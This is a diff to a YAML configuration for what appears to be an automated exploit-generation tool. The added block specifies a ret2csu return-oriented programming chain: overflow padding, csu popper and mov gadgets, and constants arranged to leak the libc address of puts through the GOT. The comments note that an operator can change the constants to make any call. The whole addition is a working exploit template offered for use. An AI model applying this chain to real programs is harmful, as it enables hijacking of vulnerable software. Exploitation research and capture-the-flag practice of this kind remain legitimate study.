@@ -30,3 +30,18 @@ mcts:
   success: 0.70
 
 priors: [14, 6]
+
+# The assembly order, resolved by lictor's builder from the facts: the
+# csu popper sets rbx=0, rbp=1, r12=fn@got, r13=arg2, r14=arg1, r15=arg0
+# then csu_mov issues mov rdx,r13 / mov rsi,r14 / mov edi,r15d / call
+# [r12+rbx*8]; 7 junk qwords fall through the second pop; the chain
+# ends on the technique that follows (leak:main keeps the process
+# alive). The arg values here are the canonical puts(puts@got) leak;
+# an operator edits the consts for their call.
+build:
+  technique: ret2csu_v2
+  layout:
+    - [padding, measured_offset]
+    - [chain, "gadget:csu_popper", "const:0", "const:1", "got_addr:puts",
+       "const:8", "got_addr:puts", "const:1", "gadget:csu_mov",
+       "const:0", "const:0", "const:0", "const:0", "const:0", "const:0", "const:0"]
